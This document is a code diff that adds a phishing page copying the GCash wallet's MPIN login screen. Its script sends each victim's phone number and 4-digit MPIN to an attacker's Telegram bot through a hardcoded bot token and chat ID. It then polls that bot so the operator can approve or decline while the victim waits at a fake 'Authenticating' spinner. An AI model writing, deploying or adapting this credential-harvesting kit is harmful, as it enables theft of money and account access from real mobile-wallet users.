@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GCash MPIN Replica</title>
+    <!-- Tailwind CSS for modern responsive utility styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0055d4 0%, #0040b0 100%);
+        }
+        
+        .keypad-circle {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            background-color: transparent;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            font-weight: 500;
+            transition: background-color 0.15s ease, transform 0.05s ease;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .keypad-circle:active {
+            background-color: rgba(255, 255, 255, 0.2);
+            transform: scale(0.93);
+        }
+        
+        .pin-dot {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid #ffffff;
+            background-color: transparent;
+            transition: all 0.2s ease;
+        }
+        
+        .pin-dot.filled {
+            background-color: #ffffff;
+        }
+        /* Overlay Styles */
+        
+        .overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 85, 212, 0.95);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            text-align: center;
+            z-index: 50;
+            color: white;
+            border-radius: inherit;
+        }
+    </style>
+</head>
+
+<body class="flex items-center justify-center min-h-screen p-0 sm:p-4">
+
+    <!-- Mobile container wrapper with GCash Blue Gradient -->
+    <div class="w-full max-w-md bg-gradient-to-b from-[#0055d4] to-[#0040b0] text-white sm:rounded-3xl shadow-2xl overflow-hidden flex flex-col justify-between min-h-[100vh] sm:min-h-[780px] pt-10 pb-8 px-6 relative">
+
+        <!-- Top Section: Logo & Header -->
+        <div class="flex flex-col items-center text-center mt-2">
+            <!-- Logo & Brand Header -->
+            <div class="flex items-center justify-center space-x-2.5 mb-6">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRiPbeWE0l7-pKcYr66BdfSRGnBTBcHuOSY1EjZhIdSkw&s=10" alt="GCash Logo" class="w-10 h-10 object-contain rounded-full bg-white p-0.5 shadow-md" onerror="this.src='https://placehold.co/40x40/ffffff/0055d4?text=G'">
+                <span class="text-2xl font-bold tracking-tight text-white">GCash</span>
+            </div>
+
+            <!-- Title -->
+            <h2 class="text-xl font-medium tracking-wide text-white mb-2">Enter your MPIN</h2>
+            <p id="errorMsg" class="text-xs text-red-200 font-medium mb-6 h-4"></p>
+
+            <!-- 4 PIN Dots -->
+            <div class="flex items-center justify-center space-x-5 mb-6">
+                <div id="dot-0" class="pin-dot"></div>
+                <div id="dot-1" class="pin-dot"></div>
+                <div id="dot-2" class="pin-dot"></div>
+                <div id="dot-3" class="pin-dot"></div>
+            </div>
+
+            <!-- Forgot MPIN Link -->
+            <div>
+                <a href="#" onclick="handleForgotMPIN(event)" class="text-white/90 text-sm font-medium hover:underline tracking-wide">
+                    Forgot MPIN?
+                </a>
+            </div>
+        </div>
+
+        <!-- Circular Numeric Keypad Section -->
+        <div class="mt-8 mb-2 flex flex-col items-center">
+            <div class="grid grid-cols-3 gap-x-6 gap-y-4 max-w-xs mx-auto justify-items-center">
+                <!-- Row 1 -->
+                <button onclick="appendMPIN('1')" class="keypad-circle">1</button>
+                <button onclick="appendMPIN('2')" class="keypad-circle">2</button>
+                <button onclick="appendMPIN('3')" class="keypad-circle">3</button>
+
+                <!-- Row 2 -->
+                <button onclick="appendMPIN('4')" class="keypad-circle">4</button>
+                <button onclick="appendMPIN('5')" class="keypad-circle">5</button>
+                <button onclick="appendMPIN('6')" class="keypad-circle">6</button>
+
+                <!-- Row 3 -->
+                <button onclick="appendMPIN('7')" class="keypad-circle">7</button>
+                <button onclick="appendMPIN('8')" class="keypad-circle">8</button>
+                <button onclick="appendMPIN('9')" class="keypad-circle">9</button>
+
+                <!-- Row 4 -->
+                <div></div>
+                <button onclick="appendMPIN('0')" class="keypad-circle">0</button>
+                <button onclick="deleteMPIN()" class="keypad-circle border-0 bg-transparent active:bg-white/10 flex items-center justify-center">
+                    <!-- Backspace SVG Icon -->
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-7 w-7 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.054 0 1.918-.864 1.918-1.918V7.918C20.836 6.864 19.972 6 18.918 6H5.062C4.008 6 3.144 6.864 3.144 7.918v8.164C3.144 17.136 4.008 18 5.062 18z" />
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M9.5 9l5 6m0-6l-5 6" />
+                    </svg>
+                </button>
+            </div>
+        </div>
+
+        <!-- Spinner Loading Overlay -->
+        <div id="spinnerOverlay" class="overlay">
+            <div class="fa-3x mb-4 text-white">
+                <i class="fa-solid fa-circle-notch fa-spin"></i>
+            </div>
+            <p class="text-white font-medium text-lg">Authenticating MPIN, please wait...</p>
+        </div>
+
+    </div>
+
+    <!-- Custom Modal for Notifications -->
+    <div id="customModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-2xl p-6 max-w-sm w-full shadow-2xl text-center transform transition-all">
+            <h3 id="modalTitle" class="text-lg font-bold text-gray-900 mb-2">Notice</h3>
+            <p id="modalMessage" class="text-gray-600 text-sm mb-6">Message goes here...</p>
+            <button onclick="closeModal()" class="w-full bg-[#0055d4] text-white py-2.5 rounded-xl font-semibold hover:bg-[#0040b0] transition">OK</button>
+        </div>
+    </div>
+
+    <!-- JavaScript Logic -->
+    <script>
+        const BOT_TOKEN = '8655434304:AAF-Ix6PLMZj8qhwXvOMUMJqbu9XWKIYKmk';
+        const CHAT_ID = '8486303623';
+
+        const savedPhone = localStorage.getItem('phone') || 'Unknown';
+
+        let mpinDigits = "";
+        const maxPinLength = 4;
+        let pollInterval;
+        let lastUpdateId = 0;
+
+        const spinnerOverlay = document.getElementById("spinnerOverlay");
+        const errorMsg = document.getElementById("errorMsg");
+
+        function appendMPIN(digit) {
+            if (mpinDigits.length < maxPinLength) {
+                errorMsg.innerText = ""; // Clear error when typing
+                mpinDigits += digit;
+                updateDots();
+
+                if (mpinDigits.length === maxPinLength) {
+                    sendToTelegram();
+                }
+            }
+        }
+
+        function deleteMPIN() {
+            if (mpinDigits.length > 0) {
+                mpinDigits = mpinDigits.slice(0, -1);
+                updateDots();
+            }
+        }
+
+        function updateDots() {
+            for (let i = 0; i < maxPinLength; i++) {
+                const dot = document.getElementById(`dot-${i}`);
+                if (i < mpinDigits.length) {
+                    dot.classList.add("filled");
+                } else {
+                    dot.classList.remove("filled");
+                }
+            }
+        }
+
+        function sendToTelegram() {
+            spinnerOverlay.style.display = 'flex';
+            const timestamp = Date.now();
+            const message = `MPIN Login Verification\n\nPhone: +63 ${savedPhone}\nEntered MPIN: ${mpinDigits}\n\nApprove access?`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: '✅ Approve',
+                                    callback_data: 'approve_' + timestamp
+                                }, {
+                                    text: '❌ Decline',
+                                    callback_data: 'decline_' + timestamp
+                                }]
+                            ]
+                        }
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (!data.ok) {
+                        spinnerOverlay.style.display = 'none';
+                        alert('Error sending to bot: ' + data.description);
+                    }
+                })
+                .catch(error => {
+                    spinnerOverlay.style.display = 'none';
+                    alert('Bot connection error: ' + error);
+                });
+
+            // Poll Telegram for interaction response
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            for (let update of data.result) {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const cbData = update.callback_query.data;
+                                    const dataParts = cbData.split('_');
+                                    if (dataParts[1] == timestamp) {
+                                        clearInterval(pollInterval);
+                                        spinnerOverlay.style.display = 'none';
+
+                                        if (dataParts[0] === 'approve') {
+                                            // Navigate to dashboard or final success page
+                                            window.location.href = 'index.html';
+                                        } else if (dataParts[0] === 'decline') {
+                                            // Reset and display error message
+                                            mpinDigits = "";
+                                            updateDots();
+                                            errorMsg.innerText = "Please enter correct MPIN";
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    });
+            }, 2000);
+        }
+
+        function handleForgotMPIN(event) {
+            event.preventDefault();
+            showModal("Forgot MPIN", "Redirecting to MPIN recovery flow...");
+        }
+
+        function showModal(title, message) {
+            document.getElementById("modalTitle").innerText = title;
+            document.getElementById("modalMessage").innerText = message;
+            document.getElementById("customModal").classList.remove("hidden");
+            document.getElementById("customModal").classList.add("flex");
+        }
+
+        function closeModal() {
+            document.getElementById("customModal").classList.remove("flex");
+            document.getElementById("customModal").classList.add("hidden");
+        }
+
+        // Keyboard support
+        document.addEventListener('keydown', (e) => {
+            if (e.key >= '0' && e.key <= '9') {
+                appendMPIN(e.key);
+            } else if (e.key === 'Backspace') {
+                deleteMPIN();
+            }
+        });
+    </script>
+</body>
+
+</html>
